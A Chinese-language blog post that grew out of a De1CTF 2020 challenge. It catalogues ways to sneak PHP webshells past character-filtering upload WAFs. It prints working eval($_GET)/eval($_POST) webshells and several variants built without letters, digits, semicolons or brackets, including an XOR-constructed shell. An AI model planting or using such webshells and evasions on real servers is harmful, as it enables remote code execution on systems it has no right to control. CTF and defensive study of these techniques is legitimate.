---
title: 从一道题到PHP Shell WAF绕过
tags: 
    - CTF
date: 2020/5/10
---

## 起因

De1CTF 2020 中有一道渗透题Hard_Pentest，第一步是要上传一个php文件shell，而这个上传点当然是有waf的
经过fuzz，确认能够使用的字符如下：
`!"#$%'()*+,-./:<=>?@[\]_{ }`
我们能发现可用的字符中无字母，无数字，更重要的是无分号

## 这道题

在这道题中，通过尝试我们能发现可以通过short open tag替代分号的作用：

```php
<?=$a=1?><?=$a?>
// 1
```

也就是说，拿一个经典的无数字字母shell来稍加修改（`replace(';', '?><?=')`）即可构造出这样一个shell  
但是我自然不会善罢甘休，想要总结一下**各个版本**中shell waf的绕过方式  
下面我们从几个初始状态开始，逐步缩减可用的字符集，看看不一样的绕过方式

### 说明

此处对下一部分如何归类与标注标题做一下简单的说明  
我将从两个初始状态开始（无字母、白名单`0b`与无字母、黑名单`0w`）向别的状态转移
当然b与w分别代表blacklist与whitelist  
当状态发生转移时，将在状态代号（如`0b`）后附加一个点（.）并添加新的状态代号，比如`0b.0`, `0b.1`  
像上面那样同以`0b.`开头的状态说明这两个状态都是由`0b`状态转移而来

## Webshell Bypass

### root strings.printable

这是一个普通的webshell：

```php
<?php
eval($_GET[_]);
eval($_POST[_];?>
```

让我们先ban掉一些普通的字符吧，先拿方括号开刀

### root.0 ban掉[]

```php
<?php
eval($_GET{_});
eval($_POST{_};?>
```

让我们读一读手册

```markdown
https://www.php.net/manual/en/language.types.array.php
> Note:
> Both square brackets and curly braces can be used interchangeably
> for accessing array elements (e.g. `$array[42]` and `$array{42}` will
> both do the same thing in the example above).

As of PHP 5.4 it is possible to array dereference the result of a
function or method call directly. Before it was only possible using
a temporary variable.

As of PHP 5.5 it is possible to array dereference an array literal.
```

### root.1 ban掉分号

这个好办，上面已经给出了解决方案，在此例中只要去掉分号就好了

```php
<?php
eval($_GET[_])?><?php
eval($_POST[_]?>
```

### root.2 ban掉引号

你在上面见到引号了么？

### root.3 ban掉大小写字母

这样的shell一开始由p师傅（ORZORZORZORZORZORZ）发布在[博客](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html)中，后来又有一篇[提高篇](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)讨论了php7下与unix glob引出的无字母webshell的利用。

首先我们要想怎么能通过字符串来取到对应的变量

从[PHP5.3.0起](https://www.php.net/manual/en/language.oop5.basic.php#:~:text=as%20of%20PHP%205.3.0)，字符串变量可以被当作函数直接调用，从PHP7开始这个字符串甚至不需要赋给一个单独的变量

```php
$x="phpinfo";$x();
```

也就是说如果我们能够利用某些方式通过别的字符构造出函数名，从而进行调用

p师傅的这篇博客中介绍了两种办法：

### root.3.w 无字母，白名单

首先要彻底没有字母，除非他已经帮你把php tag打开了（在eval里），不然一定是开着short open tag的。

PHP5.4.0起，`<?=`短开标签是一直可用的。虽然输出的垃圾信息多了一点但是不影响它好用啊（  
当然，为了更短的长度，short open tag选项打开的时候还是尽量用`<?`更舒适。

总之，要解决白名单，当务之急是拓展可用的字符。

php的"."字符串拼接符号是一个绝妙的将对象转为字符类型的工具。只要有了"."就可以构造出很多字符。

### root.3.w.0 Array

```php
<?$_=[];$_.=0;?> // .=[]，.=''，.=0/0，随便什么都行
<?=$_[3]?> // a
<?=$_+++$_+++$_+++$_++?> // 以此类推能拿到a-z
<?=$_[0]?> // A，同理能拿到A-Z
```

通过连加的方式可以缩短payload长度（谭浩强警告）

### root.3.w.1 NAN, INF (ANIF)

自**PHP7**以来，为了[遵从IEEE规范](https://www.php.net/manual/en/migration70.incompatible.php#migration70.incompatible.integers.div-by-zero)，0/0与1/0返回的是常量`float(NAN)`与`float(INF)`。没错，它们在转字符串的时候还就是`"NAN"`与`"INF"`。那么有了A、N、I、F四个字符我们能够构造出那些字符呢？

所有字符。

PHP函数实际上是[不区分大小写](https://www.php.net/manual/en/functions.user-defined.php#:~:text=Function%20names%20are%20case-insensitive)的。所以我们可以。。。

`TOLOWER`！这样我们就能构造出大小写所有字母了。有了字母我们当然可以进一步构造出所有字符。

### root.3.w.1.0 连数字也没有怎么办

true和false在php里是1和0
也就是说`true/false == INF`，`false/false == NAN`
构造出true和false那还不简单

```text
[]>[] == false
[[]]>[] == true
```

只要让你闭合tag你就有生存空间

### root.3.w.3 ban掉"." (?存疑)

如果没了字符串拼接符号，也就是缺少了一大obj->str的途径，那么还有没有可能构造出额外的字符呢？

### root.3.b 无字母，黑名单

黑名单就好玩了，用什么字符都可以，那么只需要补齐题目ban掉的那些字符即可。当然对于非强迫症而言**有可能**只需要补齐一部分字符就能做出题了。

由于php只支持256单字节字符，很多unicode字符（比如中文）的长度大于1（`strlen("啊")===3`），也就是说我们实际上是能“切”出一部分的值拿来进行运算的（`"啊"[0] === "\xe5"`）。具体为何请参考unicode表。  
在实际操作中，用汉字切与直接输入不可见字符没有本质的区别，但更直观一些（至少你能看见）

有一点就是对字符串位运算实际上不需要一个个字符串拼接。PHP会逐字节将两侧的字符串喂给位运算，得到新的字符串。

### root.3.b.x 异或

```php
<?php
$_="`{{{"^"?<>/"; // _GET
${$_}[_](${$_}[__]);
```

### root.3.b.r 取反与或非

略，见p师傅博客与各大搜索引擎

### root.4 ban掉一些标识符

### root.4.0 进制转换

`base_convert`函数提供2-36进制的转换，可以轻松提供数字到`a-z`字母的转换。
`dechex`也可以通过数字获得`a-f`的值

### root.4.1 数学函数

由于很少碰到，不展开讲了。但是见到标题应当能想到该做什么了。

## -1

这里仅对一些可能的webshell绕**内容**waf方式进行了微小的总结。其实不难发现每个绕waf的技巧都来源于php自身的动态性以及对**字符串**的各种奇妙操作。  
文中大部分跨版本不兼容的地方都进行了php文档链接的标注，以供参考。这也是本文之所以存在的一大理由。
